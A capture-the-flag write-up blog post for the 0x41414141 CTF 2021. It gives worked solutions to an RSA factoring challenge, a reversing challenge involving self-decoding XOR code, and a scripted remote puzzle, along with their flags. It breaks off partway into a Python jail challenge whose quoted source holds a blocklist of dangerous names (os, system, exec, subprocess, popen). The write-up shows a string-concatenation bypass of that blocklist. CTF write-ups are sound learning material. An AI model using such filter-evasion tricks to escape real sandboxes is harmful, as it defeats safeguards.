---
title: "0x41414141 CTF 2021"
description: "Challenges I solved during 2021 0x414141 CTF."
date: 2021-01-31T09:24:19-05:00
url: "/ctfs/2021/0x414141-writeups"
type:
 - post
categories:
 - capture the flag writeups
tags:
 - ctfs
---


> About the CTF
> - The use of any automated tools (like gobuster , dirbuster, nikto ...etc ) will result in an ip ban
> - If you aren’t familiar with solidity programming or hacking it’s ok, most of solidity related challenges are easy
> - The secret pin code for CTF entry is hidden somewhere on this site
>
> Prizes :
>- 5k usd worth of cryptocurrency will be split between the top 3 teams
> - the most creative writeups will be awarded too
>
> https://ctfd.offshift.io/challenges

# Solved

|Crypto | Misc | RE |
|-------|------|------|
| [Factorize](#factorize) |  [Optimizer](#optimizer) | [x-and-or](#x-and-or) |
| | [pyjail](#pyjail) |  | |
| | [0x414141](#0x414141)| | |
| | [File Reader](#file-reader)| | |

## Crypto

### factorize
> ```
> c: 17830167351685057470426148820703481112309475954806278304600862043185650439097181747043204885329525211579732614665322698426329449125482709124139851522121862053345527979419420678255168453521857375994190985370640433256068675028575470040533677286141917358212661540266638008376296359267047685745805295747215450691069703625474047825597597912415099008745060616375313170031232301933185011013735135370715444443319033139774851324477224585336813629117088332254309481591751292335835747491446904471032096338134760865724230819823010046719914443703839473237372520085899409816981311851296947867647723573368447922606495085341947385255
> n: 23135514747783882716888676812295359006102435689848260501709475114767217528965364658403027664227615593085036290166289063788272776788638764660757735264077730982726873368488789034079040049824603517615442321955626164064763328102556475952363475005967968681746619179641519183612638784244197749344305359692751832455587854243160406582696594311842565272623730709252650625846680194953309748453515876633303858147298846454105907265186127420148343526253775550105897136275826705375222242565865228645214598819541187583028360400160631947584202826991980657718853446368090891391744347723951620641492388205471242788631833531394634945663
>```
>
> Author : Soul

Simply factor using `from sympy import factorint` and then plug those resulting `p` and `q` values in to any [standard, basic RSA template](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py).

```python
>>> from sympy import factorint
>>> factorint(23135514747783882716888676812295359006102435689848260501709475114767217528965364658403027664227615593085036290166289063788272776788638764660757735264077730982726873368488789034079040049824603517615442321955626164064763328102556475952363475005967968681746619179641519183612638784244197749344305359692751832455587854243160406582696594311842565272623730709252650625846680194953309748453515876633303858147298846454105907265186127420148343526253775550105897136275826705375222242565865228645214598819541187583028360400160631947584202826991980657718853446368090891391744347723951620641492388205471242788631833531394634945663)
{152103631606164757991388657189704366976433537820099034648874538500153362765519668135545276650144504533686483692163171569868971464706026329525740394016509185464641520736454955410019736330026303289754303711165526821866422766844554206047678337249535003432035470125187072461808523973483360158652600992259609986591: 1, 152103631606164757991388657189704366976433537820099034648874538500153362765519668135545276650144504533686483692163171569868971464706026329525740394016509191077550351496973264159350455849525747355370985161471258126994336297660442739951587911017897809328177973473427538782352524239389465259173507406981248869793: 1}
>>> p = 152103631606164757991388657189704366976433537820099034648874538500153362765519668135545276650144504533686483692163171569868971464706026329525740394016509185464641520736454955410019736330026303289754303711165526821866422766844554206047678337249535003432035470125187072461808523973483360158652600992259609986591
>>> q = 152103631606164757991388657189704366976433537820099034648874538500153362765519668135545276650144504533686483692163171569868971464706026329525740394016509191077550351496973264159350455849525747355370985161471258126994336297660442739951587911017897809328177973473427538782352524239389465259173507406981248869793
>>> c = 17830167351685057470426148820703481112309475954806278304600862043185650439097181747043204885329525211579732614665322698426329449125482709124139851522121862053345527979419420678255168453521857375994190985370640433256068675028575470040533677286141917358212661540266638008376296359267047685745805295747215450691069703625474047825597597912415099008745060616375313170031232301933185011013735135370715444443319033139774851324477224585336813629117088332254309481591751292335835747491446904471032096338134760865724230819823010046719914443703839473237372520085899409816981311851296947867647723573368447922606495085341947385255
>>> phi = (p-1)*(q-1)
>>> def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y
...
>>> e = 0x10001 # from the given factorize.py
>>> gcd, d, b = egcd(e, phi)
>>> pt = pow(c, d, p*q)
>>> pt
11859814988225686785369654735514915744294770754112501144636493824484982559815293
```

And then:

```
decimal_to_ascii 11859814988225686785369654735514915744294770754112501144636493824484982559815293
flag{just_g0tta_f@ct0rize_1t4536}
```

Flag is `flag{just_g0tta_f@ct0rize_1t4536}`.

## RE

### x-and-or
> Author : **M_Alpha**
>
> _attached_: `x-and-or` binary

No instructions, just a binary.

```bash
file x-and-or
x-and-or: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d75c2db8d7b1c77fd65762741f73b19aba4f2815, for GNU/Linux 3.2.0, not stripped
```

and

```bash
checksec --file=x-and-or
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   77) Symbols	  No	0		2		x-and-or
```

Running it, can see it just spits out whether or not we got the flag right:

```bash
./x-and-or
Enter the flag: flag{flag}
That is not the flag.
```

`strings`, etc. do not reveal any freebies. To Ghidra.

In the list of recognized functions in the Symbol Tree output, we see something titled `check_password`. That seems like what we'll need to be looking at.

If we look at it's entry point, we can see that the `check_password` function is getting called as part of `init()`:

```c
int init(EVP_PKEY_CTX *ctx)

{
  long lVar1;

  code = (undefined *)mmap((void *)0x0,0x1000,7,0x22,0,0);
  *code = 0x55;
  lVar1 = 1;
  do {
    code[lVar1] = (&check_password)[lVar1] ^ 0x42;
    lVar1 = lVar1 + 1;
  } while (lVar1 != 500);
  return 500;
}
```

Now it makes sense why we didn't see any actual code in the `check_password` function originally; it is being dynamically created and stored on the heap.

The `mmap` is allocating some space, in this case,
* `0x1000`, so we are getting 4000 bytes
* `7`, so it is _executable_.
* It's reading with 0 offset, and taking from STDIN

Then we set a pointer to the function's value to be `0x55`, which is `push rbp`, which is always the first instruction in a x86 stack frame, so we're effectively making the very first part of the new stack frame there.

Then, after setting a helper variable to one, it looks over 500 times, building the dynamic code by XOR'ing the value of the code at the current index by `0x42`.

So, in order to be able to see what this end result code is, we can fire up the binary in `gdb`/`gef`/`peda`/whatever you use, and break right before our main binary exits. At that point, the code will have been created and sitting there on the heap, so we can go poke at it.


```python
gdb-peda$ disas main
...
   0x00000000000012d9 <+201>:	je     0x12e0 <main+208>
   0x00000000000012db <+203>:	call   0x1040 <__stack_chk_fail@plt>
   0x00000000000012e0 <+208>:	leave
   0x00000000000012e1 <+209>:	ret
End of assembler dump.

gdb-peda$ break *main+209
Breakpoint 1 at 0x12e1
```

Now we're sitting before main program execution, we can look at `vmmap` to try to get the built code:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x000055c15028b000 0x000055c15028c000 r-xp	/x-and-or
0x000055c15028c000 0x000055c15028d000 r-xp	/x-and-or
0x000055c15028d000 0x000055c15028e000 r-xp	/x-and-or
0x000055c15028e000 0x000055c15028f000 r-xp	/x-and-or
0x000055c15028f000 0x000055c150290000 rwxp	/x-and-or
0x000055c1502cf000 0x000055c1502f0000 rwxp	[heap]
0x00007f67f3ce2000 0x00007f67f3d07000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3d07000 0x00007f67f3e52000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3e52000 0x00007f67f3e9c000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3e9c000 0x00007f67f3e9d000 ---p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3e9d000 0x00007f67f3ea0000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3ea0000 0x00007f67f3ea3000 rwxp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f67f3ea3000 0x00007f67f3ea9000 rwxp	mapped
0x00007f67f3eb5000 0x00007f67f3eb6000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67f3eb6000 0x00007f67f3ed6000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67f3ed6000 0x00007f67f3ede000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67f3ede000 0x00007f67f3edf000 rwxp	mapped
0x00007f67f3edf000 0x00007f67f3ee0000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67f3ee0000 0x00007f67f3ee1000 rwxp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007f67f3ee1000 0x00007f67f3ee2000 rwxp	mapped
0x00007ffd40d79000 0x00007ffd40d9a000 rwxp	[stack]
0x00007ffd40df6000 0x00007ffd40df9000 r--p	[vvar]
0x00007ffd40df9000 0x00007ffd40dfb000 r-xp	[vdso]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

So `0x000055c15028b000` is the start of the program. According to Ghidra, our generated function starts at `4070` past the start of our program:

{{< image src="/img/0x414141_2021/code_start.png" alt="code_start.png" position="center" style="border-radius: 8px;" >}}

Ok; so

```
gdb-peda$ x/x 0x000055c15028b000 + 0x4070
0x55c15028f070 <code>:	0x00007f67f3ede000
```

:suprised pikachu: -- That's the start of the function!

To confirm;

```
gdb-peda$ x/500i 0x00007f67f3ede000
   0x7f67f3ede000:	push   rbp
   0x7f67f3ede001:	mov    rbp,rsp
   0x7f67f3ede004:	sub    rsp,0x50
   0x7f67f3ede008:	mov    QWORD PTR [rbp-0x48],rdi
   0x7f67f3ede00c:	mov    DWORD PTR [rbp-0x4c],esi
   0x7f67f3ede00f:	mov    rax,QWORD PTR fs:0x28
   0x7f67f3ede018:	mov    QWORD PTR [rbp-0x8],rax
   0x7f67f3ede01c:	xor    eax,eax
   0x7f67f3ede01e:	movabs rax,0x3136483b7c696d66
   0x7f67f3ede028:	movabs rdx,0x786c31631977283e
   0x7f67f3ede032:	mov    QWORD PTR [rbp-0x30],rax
   0x7f67f3ede036:	mov    QWORD PTR [rbp-0x28],rdx
   0x7f67f3ede03a:	movabs rax,0x4e267d3d63334e24
   0x7f67f3ede044:	movabs rdx,0x31311c232b303937
   0x7f67f3ede04e:	mov    QWORD PTR [rbp-0x20],rax
   0x7f67f3ede052:	mov    QWORD PTR [rbp-0x18],rdx
   0x7f67f3ede056:	mov    DWORD PTR [rbp-0x10],0x1b74296a
   0x7f67f3ede05d:	mov    WORD PTR [rbp-0xc],0x7c62
   0x7f67f3ede063:	mov    BYTE PTR [rbp-0xa],0x0
   0x7f67f3ede067:	mov    DWORD PTR [rbp-0x34],0x26
   0x7f67f3ede06e:	mov    eax,DWORD PTR [rbp-0x34]
   0x7f67f3ede071:	cmp    eax,DWORD PTR [rbp-0x4c]
   0x7f67f3ede074:	je     0x7f67f3ede080
   0x7f67f3ede076:	mov    eax,0xffffffff
   0x7f67f3ede07b:	jmp    0x7f67f3ede152
   0x7f67f3ede080:	mov    DWORD PTR [rbp-0x38],0x0
   0x7f67f3ede087:	jmp    0x7f67f3ede141
   0x7f67f3ede08c:	mov    eax,DWORD PTR [rbp-0x38]
   0x7f67f3ede08f:	cdqe
   0x7f67f3ede091:	movzx  eax,BYTE PTR [rbp+rax*1-0x30]
   0x7f67f3ede096:	movsx  edi,al
   0x7f67f3ede099:	mov    edx,DWORD PTR [rbp-0x38]
   0x7f67f3ede09c:	movsxd rax,edx
   0x7f67f3ede09f:	imul   rax,rax,0x2aaaaaab
   0x7f67f3ede0a6:	shr    rax,0x20
   0x7f67f3ede0aa:	mov    esi,edx
   0x7f67f3ede0ac:	sar    esi,0x1f
   0x7f67f3ede0af:	mov    ecx,eax
   0x7f67f3ede0b1:	sub    ecx,esi
   0x7f67f3ede0b3:	mov    eax,ecx
   0x7f67f3ede0b5:	add    eax,eax
   0x7f67f3ede0b7:	add    eax,ecx
   0x7f67f3ede0b9:	add    eax,eax
   0x7f67f3ede0bb:	mov    ecx,edx
   0x7f67f3ede0bd:	sub    ecx,eax
   0x7f67f3ede0bf:	mov    esi,DWORD PTR [rbp-0x38]
   0x7f67f3ede0c2:	movsxd rax,esi
   0x7f67f3ede0c5:	imul   rax,rax,0x2aaaaaab
   0x7f67f3ede0cc:	shr    rax,0x20
   0x7f67f3ede0d0:	mov    r8d,esi
   0x7f67f3ede0d3:	sar    r8d,0x1f
   0x7f67f3ede0d7:	mov    edx,eax
   0x7f67f3ede0d9:	sub    edx,r8d
   0x7f67f3ede0dc:	mov    eax,edx
   0x7f67f3ede0de:	add    eax,eax
   0x7f67f3ede0e0:	add    eax,edx
   0x7f67f3ede0e2:	add    eax,eax
   0x7f67f3ede0e4:	sub    esi,eax
   0x7f67f3ede0e6:	mov    edx,esi
   0x7f67f3ede0e8:	mov    esi,ecx
   0x7f67f3ede0ea:	imul   esi,edx
   0x7f67f3ede0ed:	mov    ecx,DWORD PTR [rbp-0x38]
   0x7f67f3ede0f0:	movsxd rax,ecx
   0x7f67f3ede0f3:	imul   rax,rax,0x2aaaaaab
   0x7f67f3ede0fa:	shr    rax,0x20
   0x7f67f3ede0fe:	mov    r8d,ecx
   0x7f67f3ede101:	sar    r8d,0x1f
   0x7f67f3ede105:	mov    edx,eax
   0x7f67f3ede107:	sub    edx,r8d
   0x7f67f3ede10a:	mov    eax,edx
   0x7f67f3ede10c:	add    eax,eax
   0x7f67f3ede10e:	add    eax,edx
   0x7f67f3ede110:	add    eax,eax
   0x7f67f3ede112:	sub    ecx,eax
   0x7f67f3ede114:	mov    edx,ecx
   0x7f67f3ede116:	mov    eax,esi
   0x7f67f3ede118:	imul   eax,edx
   0x7f67f3ede11b:	xor    edi,eax
   0x7f67f3ede11d:	mov    edx,edi
   0x7f67f3ede11f:	mov    eax,DWORD PTR [rbp-0x38]
   0x7f67f3ede122:	movsxd rcx,eax
   0x7f67f3ede125:	mov    rax,QWORD PTR [rbp-0x48]
   0x7f67f3ede129:	add    rax,rcx
   0x7f67f3ede12c:	movzx  eax,BYTE PTR [rax]
   0x7f67f3ede12f:	movsx  eax,al
   0x7f67f3ede132:	cmp    edx,eax
   0x7f67f3ede134:	je     0x7f67f3ede13d
   0x7f67f3ede136:	mov    eax,0xffffffff
   0x7f67f3ede13b:	jmp    0x7f67f3ede152
   0x7f67f3ede13d:	add    DWORD PTR [rbp-0x38],0x1
   0x7f67f3ede141:	mov    eax,DWORD PTR [rbp-0x38]
   0x7f67f3ede144:	cmp    eax,DWORD PTR [rbp-0x34]
   0x7f67f3ede147:	jl     0x7f67f3ede08c
   0x7f67f3ede14d:	mov    eax,0x0
   0x7f67f3ede152:	mov    rdi,QWORD PTR [rbp-0x8]
   0x7f67f3ede156:	sub    rdi,QWORD PTR fs:0x28
   0x7f67f3ede15f:	je     0x7f67f3ede166
   0x7f67f3ede161:	call   0x7f67f3ede166
   0x7f67f3ede166:	leave
   0x7f67f3ede167:	ret
...
```

Which is indeed the whole code function (I listed 500 since wasn't sure how big, turns out it is exactly 100 lines).

Rather than try to grok what this is doing in Assembly, we can get the bytes that make up this section, turn them into binary, and then feed that back into another Ghidra window and see if it gives us some (nicer to look at) decompiled c code.

We know the start, and `ret` in assembly is `0xc3`, so we can go until we find that:

```
gdb-peda$ x/500x 0x7f67f3ede000
0x7f67f3ede000:	0x55	0x48	0x89	0xe5	0x48	0x83	0xec	0x50
0x7f67f3ede008:	0x48	0x89	0x7d	0xb8	0x89	0x75	0xb4	0x64
0x7f67f3ede010:	0x48	0x8b	0x04	0x25	0x28	0x00	0x00	0x00
0x7f67f3ede018:	0x48	0x89	0x45	0xf8	0x31	0xc0	0x48	0xb8
0x7f67f3ede020:	0x66	0x6d	0x69	0x7c	0x3b	0x48	0x36	0x31
0x7f67f3ede028:	0x48	0xba	0x3e	0x28	0x77	0x19	0x63	0x31
0x7f67f3ede030:	0x6c	0x78	0x48	0x89	0x45	0xd0	0x48	0x89
0x7f67f3ede038:	0x55	0xd8	0x48	0xb8	0x24	0x4e	0x33	0x63
0x7f67f3ede040:	0x3d	0x7d	0x26	0x4e	0x48	0xba	0x37	0x39
0x7f67f3ede048:	0x30	0x2b	0x23	0x1c	0x31	0x31	0x48	0x89
0x7f67f3ede050:	0x45	0xe0	0x48	0x89	0x55	0xe8	0xc7	0x45
0x7f67f3ede058:	0xf0	0x6a	0x29	0x74	0x1b	0x66	0xc7	0x45
0x7f67f3ede060:	0xf4	0x62	0x7c	0xc6	0x45	0xf6	0x00	0xc7
0x7f67f3ede068:	0x45	0xcc	0x26	0x00	0x00	0x00	0x8b	0x45
0x7f67f3ede070:	0xcc	0x3b	0x45	0xb4	0x74	0x0a	0xb8	0xff
0x7f67f3ede078:	0xff	0xff	0xff	0xe9	0xd2	0x00	0x00	0x00
0x7f67f3ede080:	0xc7	0x45	0xc8	0x00	0x00	0x00	0x00	0xe9
0x7f67f3ede088:	0xb5	0x00	0x00	0x00	0x8b	0x45	0xc8	0x48
0x7f67f3ede090:	0x98	0x0f	0xb6	0x44	0x05	0xd0	0x0f	0xbe
0x7f67f3ede098:	0xf8	0x8b	0x55	0xc8	0x48	0x63	0xc2	0x48
0x7f67f3ede0a0:	0x69	0xc0	0xab	0xaa	0xaa	0x2a	0x48	0xc1
0x7f67f3ede0a8:	0xe8	0x20	0x89	0xd6	0xc1	0xfe	0x1f	0x89
0x7f67f3ede0b0:	0xc1	0x29	0xf1	0x89	0xc8	0x01	0xc0	0x01
0x7f67f3ede0b8:	0xc8	0x01	0xc0	0x89	0xd1	0x29	0xc1	0x8b
0x7f67f3ede0c0:	0x75	0xc8	0x48	0x63	0xc6	0x48	0x69	0xc0
0x7f67f3ede0c8:	0xab	0xaa	0xaa	0x2a	0x48	0xc1	0xe8	0x20
0x7f67f3ede0d0:	0x41	0x89	0xf0	0x41	0xc1	0xf8	0x1f	0x89
0x7f67f3ede0d8:	0xc2	0x44	0x29	0xc2	0x89	0xd0	0x01	0xc0
0x7f67f3ede0e0:	0x01	0xd0	0x01	0xc0	0x29	0xc6	0x89	0xf2
0x7f67f3ede0e8:	0x89	0xce	0x0f	0xaf	0xf2	0x8b	0x4d	0xc8
0x7f67f3ede0f0:	0x48	0x63	0xc1	0x48	0x69	0xc0	0xab	0xaa
0x7f67f3ede0f8:	0xaa	0x2a	0x48	0xc1	0xe8	0x20	0x41	0x89
0x7f67f3ede100:	0xc8	0x41	0xc1	0xf8	0x1f	0x89	0xc2	0x44
0x7f67f3ede108:	0x29	0xc2	0x89	0xd0	0x01	0xc0	0x01	0xd0
0x7f67f3ede110:	0x01	0xc0	0x29	0xc1	0x89	0xca	0x89	0xf0
0x7f67f3ede118:	0x0f	0xaf	0xc2	0x31	0xc7	0x89	0xfa	0x8b
0x7f67f3ede120:	0x45	0xc8	0x48	0x63	0xc8	0x48	0x8b	0x45
0x7f67f3ede128:	0xb8	0x48	0x01	0xc8	0x0f	0xb6	0x00	0x0f
0x7f67f3ede130:	0xbe	0xc0	0x39	0xc2	0x74	0x07	0xb8	0xff
0x7f67f3ede138:	0xff	0xff	0xff	0xeb	0x15	0x83	0x45	0xc8
0x7f67f3ede140:	0x01	0x8b	0x45	0xc8	0x3b	0x45	0xcc	0x0f
0x7f67f3ede148:	0x8c	0x3f	0xff	0xff	0xff	0xb8	0x00	0x00
0x7f67f3ede150:	0x00	0x00	0x48	0x8b	0x7d	0xf8	0x64	0x48
0x7f67f3ede158:	0x2b	0x3c	0x25	0x28	0x00	0x00	0x00	0x74
0x7f67f3ede160:	0x05	0xe8	0x00	0x00	0x00	0x00	0xc9	0xc3
...
```

I just copied that out and processed w/Bash since am lame.

```bash
cat code_instructions  | sed 's/.*://g' | xargs | sed 's/0x//g' | sed 's/ //g'
554889e54883ec5048897db88975b464488b042528000000488945f831c048b8666d697c3b48363148ba3e28771963316c78488945d0488955d848b8244e33633d7d264e48ba3739302b231c3131488945e0488955e8c745f06a29741b66c745f4627cc645f600c745cc260000008b45cc3b45b4740ab8ffffffffe9d2000000c745c800000000e9b50000008b45c848980fb64405d00fbef88b55c84863c24869c0abaaaa2a48c1e82089d6c1fe1f89c129f189c801c001c801c089d129c18b75c84863c64869c0abaaaa2a48c1e8204189f041c1f81f89c24429c289d001c001d001c029c689f289ce0faff28b4dc84863c14869c0abaaaa2a48c1e8204189c841c1f81f89c24429c289d001c001d001c029c189ca89f00fafc231c789fa8b45c84863c8488b45b84801c80fb6000fbec039c27407b8ffffffffeb158345c8018b45c83b45cc0f8c3fffffffb800000000488b7df864482b3c25280000007405e800000000c9c3
```

Which we can then convert to binary (using xxd, binascii, whatever you use):

```bash
echo 554889e54883ec5048897db88975b464488b042528000000488945f831c048b8666d697c3b48363148ba3e28771963316c78488945d0488955d848b8244e33633d7d264e48ba3739302b231c3131488945e0488955e8c745f06a29741b66c745f4627cc645f600c745cc260000008b45cc3b45b4740ab8ffffffffe9d2000000c745c800000000e9b50000008b45c848980fb64405d00fbef88b55c84863c24869c0abaaaa2a48c1e82089d6c1fe1f89c129f189c801c001c801c089d129c18b75c84863c64869c0abaaaa2a48c1e8204189f041c1f81f89c24429c289d001c001d001c029c689f289ce0faff28b4dc84863c14869c0abaaaa2a48c1e8204189c841c1f81f89c24429c289d001c001d001c029c189ca89f00fafc231c789fa8b45c84863c8488b45b84801c80fb6000fbec039c27407b8ffffffffeb158345c8018b45c83b45cc0f8c3fffffffb800000000488b7df864482b3c25280000007405e800000000c9c3 | xxd -r -p - > x-and-or-code.bin
```
Now we can fire this bad boy up in Ghidra.

> N.b.: I had to upgrade my Ghidra from `9.0.2` to `9.2.2` in order to get the local variable values shown below.

```c

undefined8 FUN_00000000(long param_1,int param_2)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  int local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  undefined2 local_14;
  undefined local_12;
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_38 = 0x3136483b7c696d66;
  local_30 = 0x786c31631977283e;
  local_28 = 0x4e267d3d63334e24;
  local_20 = 0x31311c232b303937;
  local_18 = 0x1b74296a;
  local_14 = 0x7c62;
  local_12 = 0;
  if (param_2 == 0x26) {
    local_40 = 0;
    while (local_40 < 0x26) {
      if (((int)*(char *)((long)&local_38 + (long)local_40) ^
          (local_40 % 6) * (local_40 % 6) * (local_40 % 6)) != (int)*(char *)(param_1 + local_40)) {
        return 0xffffffff;
      }
      local_40 = local_40 + 1;
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 0xffffffff;
  }
  return uVar1;
}
```

So, we are starting with some chunks of data and a index variable. We iterate through each byte of the local variable data and take the current index mod 6, cubed, and XOR that against the current index byte.

Since it's little endian, we'll be working backwards through those hex values; i.e

```
0x3136483b7c696d66 -->
index 0 = 0x66
index 1 = 0x6d
index 2 = 0x69
...
# up to end, then start at the next chunk
```

The logic here is now simple to reverse, as we have the list of bytes to operate against, and the simple XOR/mod cube logic now; e.g

```
index0 -> 0x66 ^ ((0%6)*(0%6)*(0%6)) -> 0x66
index 1 -> 0x6d ^ ((1%6)*(1%6)*(1%6)) -> 0x6c
index 2 -> 0x69 ^ ((2%6)*(2%6)*(2%6)) -> 0x61
...
```

Attentive minds will notice that starts spelling `flag{...`. Now just need to loop through that and we have our flag. Some ugly python code hackily dealing with endian-ness of the byte strings poorly:

```python
#!/usr/bin/env python3
# What we're given
a = "3136483b7c696d66"
b = "786c31631977283e"
c = "4e267d3d63334e24"
d = "31311c232b303937"
e = "1b74296a"
f = "7c62"

#lulz, combine in a literal string, per little endianess
chunk = ""
for val in [a, b, c, d, e, f]:
  chunk += "".join(map(str.__add__, val[-2::-2], val[-1::-2]))

# get flag
print(f"To be worked with: 0x{chunk}")
idx = 0
for i in range(0, len(chunk), 2):
    print(chr(int(chunk[i:i+2], 16) ^ ((idx % 6)*(idx % 6)*(idx % 6))), end = '')
    idx += 1

print()
```

Flag is `flag{560637dc0dcd33b5ff37880ca10b24fb}`.

---

## Misc
### Optimizer

> optimizer
> <points>
> EU instance: `207.180.200.166 9660`
>
> US instance: `45.134.3.200 9660`
>
> author: **pop_eax**

Connecting, we get was looks like its going to be a round based game:

```bash
nc 45.134.3.200 9660
you will be given a number of problems give me the least number of moves to solve them
level 1: tower of hanoi
[45, 30, 11, 51, 59, 7, 15, 36, 48, 29, 7, 21, 25, 61, 47, 3, 11, 55, 62, 39, 52, 46]
> 69
wrong, the answer is 4194303
```

So, first level is determining the number of moves to solve a [Tower of Hanoi](https://en.wikipedia.org/wiki/Tower_of_Hanoi) problem.

If you are unfamiliar with what that is, it's essentially a math puzzle game where you have to move some rings according to some rules across some pegs. Here, we are presumably presented the number of disks as the entries in the list. In the above,

```python
[45, 30, 11, 51, 59, 7, 15, 36, 48, 29, 7, 21, 25, 61, 47, 3, 11, 55, 62, 39, 52, 46]
```

After a brief (like, 30 seconds) of googling around for things related to keywords of the above, I came across [this page describing the Explicit Rule](https://towerofhanoi.weebly.com/explicit-rule.html); the minimum number of required moves independent of previous moves:

> `T(n) = 2^n - 1`
>
> -- where n is the number of discs

So, we can simply calculate `(2^len(given_list)) - 1` and that is our answer. Sanity checking our first answer:

```python
>>> given = [45, 30, 11, 51, 59, 7, 15, 36, 48, 29, 7, 21, 25, 61, 47, 3, 11, 55, 62, 39, 52, 46]
>>> pow(2, len(given)) - 1
4194303
```

Which matches.  After some trial and error (and `while 1<2` pwntools looping), we find out that there are 25 rounds in level 1.

After passing all of those, we get round 2:

```
...
level 2 : merge sort, give me the count of inversions
[30, 29, 63, 26, 53, 16, 50, 34, 28, 12, 27, 25, 25, 20, 31, 50, 64, 19, 63, 13, 38, 36, 8, 62, 59, 24, 48, 4, 64, 9, 64, 4, 51, 51, 50, 3, 13, 24, 21, 10, 2, 17, 25, 14, 4, 59, 30, 47, 12, 12, 43, 21, 25, 40, 53, 1, 3, 22, 52, 16, 39, 31, 33, 31, 2, 58, 27, 5, 55, 52, 44, 10, 48, 48, 30, 25, 62, 16, 44, 57, 20, 17, 32, 35, 47, 29, 28, 25, 1, 12, 19, 25, 37, 64, 49, 28, 7, 4, 38, 1, 12, 50, 50, 33, 8, 56, 33, 30, 30, 18, 4, 24, 35, 27, 27, 20, 62, 31, 41, 32, 57, 1, 45, 7, 12, 52, 22, 46, 57, 49, 26, 43, 60, 30, 13, 24, 55, 3, 26, 28, 64, 55, 10]
...
```

So, now this time, we have to count the [inversions in a mergesort operation](http://doctrina.org/Merge-Sort-And-Inversions.html).

Again, first google search for "Python count inversions merge sort" leads us straight to a suitable answer, in [this stackoverflow answer](https://stackoverflow.com/a/23621907/13158274).

I just straight lifted that code, and it successfully passes our challenge (after being tied up into pwntools as well).

My finalized code:

```python
#!/usr/bin/env python3
from pwn import *
import json
import os.path
#context.log_level = 'debug'

# https://stackoverflow.com/a/23621907/13158274
def merge_list(left,right):
    result = list()
    i,j = 0,0
    inv_count = 0
    while i < len(left) and j < len(right):
        if left[i] <= right[j]:
            result.append(left[i])
            i += 1
        else:
            result.append(right[j])
            j += 1
            inv_count += (len(left)-i)
    result += left[i:]
    result += right[j:]
    return result,inv_count

# https://stackoverflow.com/a/23621907/13158274
def sort_and_count(array):
    if len(array) <= 1:
        return array, 0
    middle = len(array) // 2
    left,inv_left = sort_and_count(array[:middle])
    right,inv_right = sort_and_count(array[middle:])
    merged, count = merge_list(left,right)
    count += (inv_left + inv_right)
    return merged, count



def main():
    r = remote('45.134.3.200', 9660)
    r.recvline() # you will be given a number of problems give me the least number of moves to solve them

    print(r.recvline().decode()) # level 1: hanoi
    for i in range(25):
        nums = list(map(int, r.recvline().decode().strip()[1:-1].split(", ")))
        r.sendafter(b'> ', str(pow(2, len(nums)) - 1))

    print(r.recvline().decode()) # level 2: mergesort
    for i in range(25):
        nums = list(map(int, r.recvline().decode().strip()[1:-1].split(", ")))
        merge_array,inversions = sort_and_count(nums)
        r.sendafter(b'> ', str(inversions))
    print(r.stream().decode())

if __name__ == '__main__':
    main()
```

Which gives us our flag:

```
python3 optimizer.py
[+] Opening connection to 45.134.3.200 on port 9660: Done
level 1: tower of hanoi

level 2 : merge sort, give me the count of inversions

you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}
```

Flag is `flag{g077a_0pt1m1ze_3m_@ll}`.

### pyjail
> Escape me plz.
>
> EU instance: `207.180.200.166 1024`
>
> US instance: `45.134.3.200 1024`
>
> author: **pop_eax** & **Tango**

We're given the source code:

```python
#!/usr/bin/env python3

import re
from sys import modules, version

banned = "import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data"
search_func = lambda word: re.compile(r"\b({0})\b".format(word), flags=re.IGNORECASE).search

modules.clear()
del modules

def main():
    print(f"{version}\n")
    print("What would you like to say?")
    for _ in range(2):
        text = input('>>> ').lower()
        check = search_func(banned)(''.join(text.split("__")))
        if check:
            print(f"Nope, we ain't letting you use {check.group(0)}!")
            break
        if re.match("^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$", text):
            print("You aren't getting through that easily, come on.")
            break
        else:
            exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print})

if __name__ == "__main__":
    main()
```

So, we see that there is some list of words that get banned via regex match, notably, anything immediately useful for simple Python jails.

The regex handles tricks like

```python
'OS'.lower()
# etc
```

But doesn't cover something like `'o'+'s'`:

```
nc 45.134.3.200 1024
3.8.0 (default, Oct 28 2019, 16:14:01)
[GCC 8.3.0]

What would you like to say?
>>> print('o'+'s')
os
```

Also, we can notice it's a Python3 jail, as Python2 syntax does not work:

```
nc 45.134.3.200 1024
3.8.0 (default, Oct 28 2019, 16:14:01)
[GCC 8.3.0]

What would you like to say?
>>> print "lul too old"
Traceback (most recent call last):
